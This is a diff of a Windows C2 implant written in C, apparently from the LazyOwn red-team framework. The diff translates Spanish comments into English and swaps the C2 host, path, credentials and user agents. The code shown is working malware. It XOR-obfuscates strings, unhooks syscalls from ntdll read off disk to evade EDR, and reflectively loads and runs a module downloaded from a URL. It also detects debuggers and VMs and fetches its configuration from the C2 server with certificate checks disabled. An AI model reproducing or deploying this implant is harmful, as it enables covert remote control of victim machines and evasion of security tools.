@@ -82,7 +82,7 @@ typedef struct _IO_STATUS_BLOCK {
 #define FILE_DIRECTORY_FILE 0x00000001
 
 
-// Declaraciones manuales de funciones NTAPI
+// Manual declarations of NTAPI functions
 NTSYSAPI VOID NTAPI RtlInitUnicodeString(
     PUNICODE_STRING DestinationString,
     PCWSTR SourceString
@@ -90,7 +90,7 @@ NTSYSAPI VOID NTAPI RtlInitUnicodeString(
 
 NTSYSAPI ULONG NTAPI RtlNtStatusToDosError(NTSTATUS Status);
 
-// Convierte UTF-8 a wide string
+// Converts UTF-8 to wide string
 WCHAR* UTF8ToWide(const char* utf8) {
     int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
     WCHAR* wide = (WCHAR*)malloc(len * sizeof(WCHAR));
@@ -114,33 +114,33 @@ WCHAR* UTF8ToWide(const char* utf8) {
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "user32.lib")
 // =================================================================================================
-// CONFIGURACIÓN
+// CONFIGURATION
 // =================================================================================================
 
-// === OFUSCACIÓN DE STRINGS ===
+// === STRING OBFUSCATION ===
 unsigned char OBF_TARGET_PROCESS[] = { 112,9,28,100,90,93,87,92,68,64,28,96,74,64,71,86,94,0,1,28,64,69,80,91,92,64,71,29,86,75,86, 0 };
-unsigned char OBF_USER_AGENT[] = { 126,92,73,90,95,95,82,28,6,29,3,19,27,100,90,93,87,92,68,64,19,125,103,19,2,3,29,3,8,19,100,90,93,5,7,8,19,75,5,7,26,19,114,67,67,95,86,100,86,81,120,90,71,28,6,0,4,29,0,5,19,27,120,123,103,126,127,31,19,95,90,88,86,19,116,86,80,88,92,26,19,112,91,65,92,94,86,28,2,1,3,29,3,29,3,29,3,19,96,82,85,82,65,90,28,6,0,4,29,0,5, 0 };
+unsigned char OBF_USER_AGENT[] = { 126,92,73,90,95,95,82,28,6,29,3,19,27,100,90,93,87,92,68,64,19,125,103,19,2,3,29,3,8,19,100,90,93,5,7,8,19,75,5,7,26,19,114,67,67,95,86,100,86,81,120,90,71,28,6,0,4,29,0,5, 0 };
 
-// === CONFIGURACIÓN ===
+// === CONFIGURATION ===
 #define XOR_KEY 0x33
 #define DEBUG
 #define TIMEOUT 15
 #define MAX_RESPONSE_SIZE 2097152
-#define C2_URL "https://10.10.14.91:4444"
-#define MALEABLE "/pleasesubscribe/v1/users/"
-#define CLIENT_ID "windows"
+#define C2_URL "https://c2.ejemplo.com:8443"
+#define MALEABLE "/api/v2/submit"
+#define CLIENT_ID "win10-pro"
 #define SLEEP_BASE 6000  // ms
 #define MIN_JITTER 30    // 30%
 #define MAX_JITTER 60    // 60%
 #define MAX_RETRIES 3
-#define C2_HOST "10.10.14.91"
-#define LC2_HOST L"10.10.14.91"
-#define C2_USER "LazyOwn"
-#define C2_PASS "LazyOwn"
-#define C2_PORT 4444
+#define C2_HOST "192.168.1.10"
+#define LC2_HOST L"192.168.1.10"
+#define C2_USER "AdminC2"
+#define C2_PASS "P@ssw0rd_Secret_2025"
+#define C2_PORT 8443
 #define CONFIG_PATH L"/config.json"
-#define C2_PATH "/pleasesubscribe/v1/users/windows"
-#define LC2_PATH L"/pleasesubscribe/v1/users/windows"
+#define C2_PATH "/api/v2/submitwin10-pro"
+#define LC2_PATH L"/api/v2/submitwin10-pro"
 #ifndef min
 #define min(a,b) (((a) < (b)) ? (a) : (b))
 #endif
@@ -150,8 +150,8 @@ unsigned char OBF_USER_AGENT[] = { 126,92,73,90,95,95,82,28,6,29,3,19,27,100,90,
 #ifndef INVALID_SOCKET
 #define INVALID_SOCKET (SOCKET)(~0)
 #endif
-#define USER_AGENT  L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-#define USER_AGENT_A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+#define USER_AGENT  L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+#define USER_AGENT_A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 #define IMAGE_DOS_SIGNATURE 0x5A4D
 #define IMAGE_NT_SIGNATURE 0x00004550
 #define IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b
@@ -248,7 +248,7 @@ static ProxyListener proxyListeners[10];
 static int numProxyListeners = 0;
 static BOOL proxyInitialized = FALSE;
 
-// === FIRMA DE SpLsaModeInitialize (MinGW compatible) ===
+// === SpLsaModeInitialize SIGNATURE (MinGW compatible) ===
 
 typedef NTSTATUS (NTAPI *SpLsaModeInitialize_t)(
     ULONG LsaVersion,
@@ -259,7 +259,7 @@ typedef NTSTATUS (NTAPI *SpLsaModeInitialize_t)(
 
 #endif // _SECURITY_PACKAGE_DEFINITION_
 
-// === DEFINICIÓN DE SpLsaModeInitialize (firma estándar) ===
+// === SpLsaModeInitialize DEFINITION (standard signature) ===
 #ifndef SECURITY_KERNEL
 typedef NTSTATUS (NTAPI *PSECPKG_KERNEL_FUNCTION)(
     PVOID PackageContext,
@@ -269,8 +269,8 @@ typedef NTSTATUS (NTAPI *PSECPKG_KERNEL_FUNCTION)(
 #endif
 
 
-// Clave AES-256 en bytes
-const char* aes_key_hex = "36870130f03bf0bba5c8ed1d3e27117891ab415c5ea6cdbcb8731ef8fc218124";
+// AES-256 key in bytes
+const char* aes_key_hex = "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899";
 
 BYTE aes_key[32];
 
@@ -323,20 +323,20 @@ typedef NTSTATUS(NTAPI* myNtCreateThreadEx)(
     LPVOID AttributeList
 );
 
-// Stubs globales
+// Global stubs
 myNtCreateFile g_pNtCreateFileUnhooked = NULL;
 myNtWriteVirtualMemory g_pNtWriteVirtualMemoryUnhooked = NULL;
 myNtProtectVirtualMemory g_pNtProtectVirtualMemoryUnhooked = NULL;
 myNtResumeThread g_pNtResumeThreadUnhooked = NULL;
 myNtCreateThreadEx g_pNtCreateThreadExUnhooked = NULL;
 
-// Convierte RVA a offset en archivo
+// Converts RVA to file offset
 PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
 {
     return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
 }
 
-// Encuentra y copia el stub de la syscall
+// Finds and copies the syscall stub
 BOOL GetSyscallStub(
     LPCSTR functionName,
     PIMAGE_EXPORT_DIRECTORY exportDirectory,
@@ -371,10 +371,10 @@ BOOL GetSyscallStub(
     return FALSE;
 }
 
-// Inicializa los stubs unhooked desde disco
+// Initializes unhooked stubs from disk
 BOOL InitializeUnhookedSyscalls()
 {
-    // Reservar memoria para stubs
+    // Allocate memory for stubs
     char* stubCreateFile = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     char* stubWriteMem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!stubCreateFile || !stubWriteMem) {
@@ -383,7 +383,7 @@ BOOL InitializeUnhookedSyscalls()
         return FALSE;
     }
 
-    // Abrir y leer ntdll.dll desde disco
+    // Open and read ntdll.dll from disk
     HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         VirtualFree(stubCreateFile, 0, MEM_RELEASE);
@@ -410,11 +410,11 @@ BOOL InitializeUnhookedSyscalls()
     }
     CloseHandle(hFile);
 
-    // Parsear headers
+    // Parse headers
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)fileData + dosHeader->e_lfanew);
 
-    // Encontrar secciones .text y .rdata
+    // Find .text and .rdata sections
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
     PIMAGE_SECTION_HEADER textSection = NULL;
     PIMAGE_SECTION_HEADER rdataSection = NULL;
@@ -434,12 +434,12 @@ BOOL InitializeUnhookedSyscalls()
         return FALSE;
     }
 
-    // Obtener export table
+    // Get export table
     DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
     PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset(
         (DWORD_PTR)fileData + exportRVA, rdataSection);
 
-    // Extraer stub de NtCreateFile
+    // Extract NtCreateFile stub
     if (!GetSyscallStub("NtCreateFile", exportDir, fileData, textSection, rdataSection, stubCreateFile)) {
         VirtualFree(fileData, 0, MEM_RELEASE);
         VirtualFree(stubCreateFile, 0, MEM_RELEASE);
@@ -447,7 +447,7 @@ BOOL InitializeUnhookedSyscalls()
         return FALSE;
     }
 
-    // Extraer stub de NtWriteVirtualMemory
+    // Extract NtWriteVirtualMemory stub
     if (!GetSyscallStub("NtWriteVirtualMemory", exportDir, fileData, textSection, rdataSection, stubWriteMem)) {
         VirtualFree(fileData, 0, MEM_RELEASE);
         VirtualFree(stubCreateFile, 0, MEM_RELEASE);
@@ -455,7 +455,7 @@ BOOL InitializeUnhookedSyscalls()
         return FALSE;
     }
 
-    // Extraer stub de NtProtectVirtualMemory
+    // Extract NtProtectVirtualMemory stub
     char* stubProtectMem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!stubProtectMem) {
         VirtualFree(stubCreateFile, 0, MEM_RELEASE);
@@ -483,7 +483,7 @@ BOOL InitializeUnhookedSyscalls()
 
     VirtualFree(fileData, 0, MEM_RELEASE);
 
-    // Extraer stub de NtResumeThread
+    // Extract NtResumeThread stub
     char* stubResumeThread = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!stubResumeThread) {
         VirtualFree(stubCreateFile, 0, MEM_RELEASE);
@@ -517,7 +517,7 @@ BOOL InitializeUnhookedSyscalls()
         VirtualFree(stubWriteMem, 0, MEM_RELEASE);
         return FALSE;
     }
-    // Extraer stub de NtCreateThreadEx
+    // Extract NtCreateThreadEx stub
     char* stubCreateThread = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!stubCreateThread) {
         VirtualFree(stubCreateFile, 0, MEM_RELEASE);
@@ -547,17 +547,17 @@ BOOL InitializeUnhookedSyscalls()
     }
 
     g_pNtCreateThreadExUnhooked = (myNtCreateThreadEx)stubCreateThread;
-    // Asignar a variables globales
+    // Assign to global variables
     g_pNtCreateFileUnhooked = (myNtCreateFile)stubCreateFile;
     g_pNtWriteVirtualMemoryUnhooked = (myNtWriteVirtualMemory)(LPVOID)stubWriteMem;
 
     return TRUE;
 }
-// Wrapper para reemplazar CreateFileA con NtCreateFile unhooked
+// Wrapper to replace CreateFileA with unhooked NtCreateFile
 HANDLE CreateFileA_Unhooked(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
 {
     if (!g_pNtCreateFileUnhooked) {
-        // Fallback a CreateFileA si el stub no está disponible
+        // Fall back to CreateFileA if the stub is not available
         return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
     }
 
@@ -599,7 +599,7 @@ HANDLE CreateFileA_Unhooked(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwSh
     );
 
     if (!NT_SUCCESS(status)) {
-        SetLastError(0); // o mapear el NTSTATUS a un código de error Win32 si lo deseas
+        SetLastError(0); // or map the NTSTATUS to a Win32 error code if you wish
         return INVALID_HANDLE_VALUE;
     }
 
@@ -614,7 +614,7 @@ BOOL WriteProcessMemory_Unhooked(
     SIZE_T* lpNumberOfBytesWritten
 ) {
     if (!g_pNtWriteVirtualMemoryUnhooked) {
-        // Fallback a WriteProcessMemory si el stub no está disponible
+        // Fall back to WriteProcessMemory if the stub is not available
         return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
     }
 
@@ -635,14 +635,14 @@ BOOL WriteProcessMemory_Unhooked(
 }
 // User-Agents
 const char* USER_AGENTS[] = {
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Chrome/120.0.0.0 Safari/537.36",
+    "CustomAgent/1.0 (compatible)",
+    "BotNet-X/2.5"
 };
 #define NUM_USER_AGENTS 4
 
-// URLs y User-Agents legítimos (como en tu Go)
+// Legitimate URLs and User-Agents (as in your Go)
 const char* TRAFFIC_URLS[] = {
     "https://grisuno.github.io/LazyOwn",
     "https://github.com/grisuno/LazyOwn",
@@ -652,9 +652,9 @@ const char* TRAFFIC_URLS[] = {
 #define NUM_URLS 4
 
 const char* TRAFFIC_UAS[] = {
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Chrome/120.0.0.0 Safari/537.36",
+    "CustomAgent/1.0 (compatible)"
 };
 #define NUM_UAS 3
 
@@ -663,14 +663,14 @@ const char* TRAFFIC_UAS[] = {
 // =================================================================================================
 static jmp_buf exceptionJump;
 static LONG WINAPI ExceptionFilter(EXCEPTION_POINTERS *ExceptionInfo) {
-    // Si es una violación de acceso
+    // If it is an access violation
     if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
         longjmp(exceptionJump, 1);
     }
     return EXCEPTION_EXECUTE_HANDLER;
 }
 
-// === ESTRUCTURAS NECESARIAS (MinGW-safe) ===
+// === REQUIRED STRUCTURES (MinGW-safe) ===
 
 
 typedef struct _LDR_DATA_TABLE_ENTRY {
@@ -714,7 +714,7 @@ typedef LONG NTSTATUS;
 typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS (NTAPI *NtQueueApcThread_t)(HANDLE, PAPCFUNC, PVOID, PVOID, PVOID);
-// Necessario para NtQueryInformationProcess
+// Required for NtQueryInformationProcess
 typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
     HANDLE ProcessHandle,
     ULONG ProcessInformationClass,
@@ -723,14 +723,14 @@ typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
     PULONG ReturnLength
 );
 
-// Necessario para RtlAdjustPrivilege
+// Required for RtlAdjustPrivilege
 typedef NTSTATUS (NTAPI *pRtlAdjustPrivilege)(
     ULONG Privilege,
     BOOLEAN Enable,
     BOOLEAN CurrentThread,
     PBOOLEAN Enabled
 );
-// Estructura para almacenar el contexto de cifrado
+// Structure to store the encryption context
 struct AES_ctx aes_ctx;
 BYTE iv[16];
 int ports[] = {80, 443, 22, 21}; 
@@ -744,7 +744,7 @@ const char* get_shell_cmd() {
     return "cmd.exe";
 }
 
-// Variables globales (deben estar definidas en otro lado)
+// Global variables (must be defined elsewhere)
 
 static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
@@ -773,7 +773,7 @@ char* command;
 
 
 // ========================
-// DECLARACIONES DE FUNCIONES 
+// FUNCTION DECLARATIONS 
 // ========================
 
 char* GetIPs();
@@ -799,7 +799,7 @@ void cleanSystemLogs();
 void restartClient();
 void selfDestruct();
 BOOL startProxy(const char* listenAddr, const char* targetAddr);
-void simulateLegitimateTraffic();
+void simulateLegitimateTraffic(void* param);
 void PortScanner(char* targetIP, int* ports, int numPorts);
 char* encrypt_data(const char* data);
 char* base64_encode(const unsigned char* data, size_t inputLen);
@@ -819,13 +819,13 @@ HMODULE GetNtdllBase(void);
 void handleAdversary(char* command);
 
 
-// === Beacon API: implementaciones exportables para BOFs ===
+// === Beacon API: exportable implementations for BOFs ===
 
 __declspec(dllexport) void BeaconDataParse(datap *parser, char *buffer, int size) {
     if (size >= 4) {
         int32_t declared = *(int32_t *)buffer;
         if (declared >= 0 && (declared + 4) == size) {
-            /* formato oficial: saltamos los 4 bytes de longitud */
+            /* official format: skip the 4 length bytes */
             parser->original = buffer;
             parser->buffer   = buffer + 4;
             parser->length   = declared;
@@ -881,13 +881,13 @@ __declspec(dllexport) void BeaconPrintf(int type, const char * fmt, ...) {
     int len = vsnprintf(buffer, sizeof(buffer), fmt, args);
     va_end(args);
     
-    // Manejo de errores de vsnprintf
+    // vsnprintf error handling
     if (len < 0) {
         fprintf(stderr, "[ERROR] vsnprintf failed\n");
         return;
     }
     
-    // Truncar si es necesario
+    // Truncate if necessary
     if (len >= sizeof(buffer)) {
         len = sizeof(buffer) - 1;
         buffer[len] = '\0';
@@ -896,7 +896,7 @@ __declspec(dllexport) void BeaconPrintf(int type, const char * fmt, ...) {
     fputs(buffer, stdout);
     fflush(stdout);
     
-    // Verificar tamaños antes de concatenar
+    // Check sizes before concatenating
     //if (strlen(C2_URL) + strlen(MALEABLE) >= sizeof(full_url)) {
     //    fprintf(stderr, "[ERROR] URL too long\n");
     //    return;
@@ -905,17 +905,17 @@ __declspec(dllexport) void BeaconPrintf(int type, const char * fmt, ...) {
     //strcpy(full_url, C2_URL);
     //strcat(full_url, MALEABLE);
     
-    // Escapar JSON y limitar longitud
+    // Escape JSON and limit length
     //int max_json_content = sizeof(json) - 50;
     //int usable = (len > max_json_content) ? max_json_content : len;
     
-    // Función para escapar JSON sería ideal aquí
+    // A JSON escaping function would be ideal here
     //snprintf(json, sizeof(json), "{\"output\":\"%.*s\"}", usable, buffer);
     
     //char *encrypted = encrypt_data(json);
     //if (encrypted) {
         // retry_http_request(full_url, "POST", encrypted, MAX_RETRIES);
-        // No olvides liberar encrypted si es necesario
+        // Don't forget to free encrypted if necessary
     //}
 }
 
@@ -1014,7 +1014,7 @@ DWORD GetProcessIdByName(const char* processName) {
     CloseHandle(hSnapshot);
     return 0;
 }
-// === EJECUTAR TLS CALLBACKS ===
+// === EXECUTE TLS CALLBACKS ===
 void ExecuteTLSCallbacks(PVOID moduleBase) {
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)moduleBase;
     IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dos->e_lfanew);
@@ -1031,7 +1031,7 @@ void ExecuteTLSCallbacks(PVOID moduleBase) {
     }
 }
 
-// === Carga un módulo en memoria ===
+// === Load a module into memory ===
 PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
@@ -1043,10 +1043,10 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
     PVOID baseAddress = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!baseAddress) return NULL;
 
-    // Copiar cabeceras
+    // Copy headers
     memcpy(baseAddress, fileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
 
-    // Copiar secciones
+    // Copy sections
     IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
     for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
         if (sections[i].PointerToRawData && sections[i].SizeOfRawData) {
@@ -1056,7 +1056,7 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
         }
     }
 
-    // Reubicaciones
+    // Relocations
     IMAGE_DATA_DIRECTORY* relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     if (relocDir->Size > 0 && relocDir->VirtualAddress > 0) {
         BYTE* reloc = (BYTE*)baseAddress + relocDir->VirtualAddress;
@@ -1079,19 +1079,19 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
         }
     }
 
-    // Resolver IAT
+    // Resolve IAT
     IMAGE_DATA_DIRECTORY* importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (importDir->Size > 0 && importDir->VirtualAddress > 0) {
         IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)baseAddress + importDir->VirtualAddress);
 
         for (; importDesc->Name; importDesc++) {
             char* dllName = (char*)((BYTE*)baseAddress + importDesc->Name);
-            printf("[I] Cargando DLL: %s\n", dllName);
+            printf("[I] Loading DLL: %s\n", dllName);
             fflush(stdout);
 
             HMODULE hDll = MapDllNameToModule(dllName);
             if (!hDll) {
-                printf("[-] No se pudo cargar: %s\n", dllName);
+                printf("[-] Could not load: %s\n", dllName);
                 fflush(stdout);
                 VirtualFree(baseAddress, 0, MEM_RELEASE);
                 return NULL;
@@ -1110,7 +1110,7 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
                     firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)import->Name);
                 }
                 if (!firstThunk->u1.Function) {
-                    printf("[-] ADVERTENCIA: No resuelto: %s!%p\n", dllName, (void*)origThunk->u1.AddressOfData);
+                    printf("[-] WARNING: Unresolved: %s!%p\n", dllName, (void*)origThunk->u1.AddressOfData);
                     fflush(stdout);
                 }
             }
@@ -1120,7 +1120,7 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
     return baseAddress;
 }
 
-// === Ejecuta el módulo (DllMain o EntryPoint) ===
+// === Runs the module (DllMain or EntryPoint) ===
 BOOL ExecuteModule(PVOID moduleBase) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
     IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);
@@ -1131,50 +1131,50 @@ BOOL ExecuteModule(PVOID moduleBase) {
 
     PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 
-    // Ejecutar TLS callbacks antes de cualquier cosa
+    // Execute TLS callbacks before anything else
     ExecuteTLSCallbacks(moduleBase);
 
-    // === CASO 1: Tiene DllMain (DLL normal) ===
+    // === CASE 1: Has DllMain (normal DLL) ===
     if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
         typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
         DllMain_t DllMain = (DllMain_t)entryPoint;
 
-        // Primero: intentar DllMain
+        // First: try DllMain
         if (DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL)) {
-            printf("[+] DllMain ejecutado exitosamente\n");
+            printf("[+] DllMain executed successfully\n");
             fflush(stdout);
             return TRUE;
         } else {
-            printf("[-] DllMain devolvió FALSE → probando entry point...\n");
+            printf("[-] DllMain returned FALSE, trying entry point...\n");
             fflush(stdout);
         }
     }
 
-    // === CASO 2: Si DllMain falló o no es DLL, ejecutar entry point directamente ===
+    // === CASE 2: If DllMain failed or not a DLL, run entry point directly ===
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
     if (hThread) {
-        printf("[+] EntryPoint ejecutado en hilo\n");
+        printf("[+] EntryPoint executed in thread\n");
         fflush(stdout);
         WaitForSingleObject(hThread, INFINITE);
         CloseHandle(hThread);
         return TRUE;
     }
 
-    printf("[-] Fallo al ejecutar EntryPoint\n");
+    printf("[-] Failed to execute EntryPoint\n");
     fflush(stdout);
     return FALSE;
 }
 
-// === Carga y ejecuta un módulo desde URL ===
+// === Load and run a module from URL ===
 BOOL LoadModuleFromURL(const char* url) {
-    printf("[*] Cargando módulo desde: %s\n", url);
+    printf("[*] Loading module from: %s\n", url);
     fflush(stdout);
 
-    // === Módulo normal: cargar en memoria local ===
+    // === Normal module: load into local memory ===
     DWORD fileSize = 0;
     unsigned char* fileBuffer = DownloadToBuffer(url, &fileSize);
     if (!fileBuffer || fileSize == 0) {
-        printf("[-] Fallo al descargar módulo\n");
+        printf("[-] Failed to download module\n");
         return FALSE;
     }
 
@@ -1182,30 +1182,30 @@ BOOL LoadModuleFromURL(const char* url) {
     free(fileBuffer);
 
     if (!moduleBase) {
-        printf("[-] Fallo al mapear módulo en memoria\n");
+        printf("[-] Failed to map module into memory\n");
         return FALSE;
     }
 
-    printf("[+] Módulo cargado en: 0x%p\n", moduleBase);
+    printf("[+] Module loaded at: 0x%p\n", moduleBase);
 
     if (!ExecuteModule(moduleBase)) {
-        printf("[-] Fallo al ejecutar DllMain\n");
+        printf("[-] Failed to execute DllMain\n");
         VirtualFree(moduleBase, 0, MEM_RELEASE);
         return FALSE;
     }
 
-    // === Activación opcional para otros módulos ===
+    // === Optional activation for other modules ===
     HMODULE hDll = (HMODULE)moduleBase;
 
     typedef BOOL (WINAPI *startW_t)();
     startW_t pStartW = (startW_t)GetProcAddress(hDll, "startW");
     if (pStartW) {
-        printf("[*] Ejecutando startW...\n");
+        printf("[*] Running startW...\n");
         fflush(stdout);
         pStartW();
     }
 
-    printf("[+] Módulo normal cargado y ejecutado\n");
+    printf("[+] Normal module loaded and executed\n");
     return TRUE;
 }
 
@@ -1219,7 +1219,7 @@ void xor_string(char* data, size_t len, char key) {
 // === ANTI-ANALYSIS ===
 BOOL anti_analysis() {
     if (IsDebuggerPresent()) {
-        printf("[-] Debugger detectado.\n");
+        printf("[-] Debugger detected.\n");
         fflush(stdout);
         return TRUE;
     }
@@ -1230,7 +1230,7 @@ BOOL anti_analysis() {
         DWORD size = sizeof(buffer);
         if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
             if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
-                printf("[-] Entorno virtualizado detectado.\n");
+                printf("[-] Virtualized environment detected.\n");
                 fflush(stdout);
                 RegCloseKey(hKey);
                 return TRUE;
@@ -1242,18 +1242,18 @@ BOOL anti_analysis() {
 }
 
 BOOL load_lazyconf() {
-    const char* url = "https://10.10.14.91:4444/config.json";
+    const char* url = "https://c2.ejemplo.com:8443/config.json";
     const char* method = "GET";
     const char* data = NULL;
     int max_retries = 3;
 
-    printf("[*] load_lazyconf: intentando descargar config...\n");
+    printf("[*] load_lazyconf: trying to download config...\n");
     fflush(stdout);
-    printf("[*] Enviando %s a: %s\n", method, url);
+    printf("[*] Sending %s to: %s\n", method, url);
     fflush(stdout);
 
     for (int attempt = 0; attempt < max_retries; attempt++) {
-        printf("[*] Intento %d/%d\n", attempt + 1, max_retries);
+        printf("[*] Attempt %d/%d\n", attempt + 1, max_retries);
         fflush(stdout);
 
         HINTERNET hSession = WinHttpOpen(
@@ -1265,7 +1265,7 @@ BOOL load_lazyconf() {
         );
 
         if (!hSession) {
-            printf("[-] Error creando sesión WinHTTP\n");
+            printf("[-] Error creating WinHTTP session\n");
             fflush(stdout);
             Sleep(1000);
             continue;
@@ -1307,12 +1307,12 @@ BOOL load_lazyconf() {
             strcpy(path, "/");
         }
 
-        printf("[D] Host: %s, Puerto: %d, Path: %s\n", host, port, path);
+        printf("[D] Host: %s, Port: %d, Path: %s\n", host, port, path);
         fflush(stdout);
 
         HINTERNET hConnect = WinHttpConnect(hSession, UTF8ToWide(host), port, 0);
         if (!hConnect) {
-            printf("[-] Error conectando a %s:%d\n", host, port);
+            printf("[-] Error connecting to %s:%d\n", host, port);
             fflush(stdout);
             WinHttpCloseHandle(hSession);
             Sleep(1000);
@@ -1335,7 +1335,7 @@ BOOL load_lazyconf() {
         );
 
         if (!hRequest) {
-            printf("[-] Error creando request\n");
+            printf("[-] Error creating request\n");
             fflush(stdout);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hSession);
@@ -1343,7 +1343,7 @@ BOOL load_lazyconf() {
             continue;
         }
 
-        // Configurar flags de seguridad para HTTPS
+        // Configure security flags for HTTPS
         if (request_flags & WINHTTP_FLAG_SECURE) {
             DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
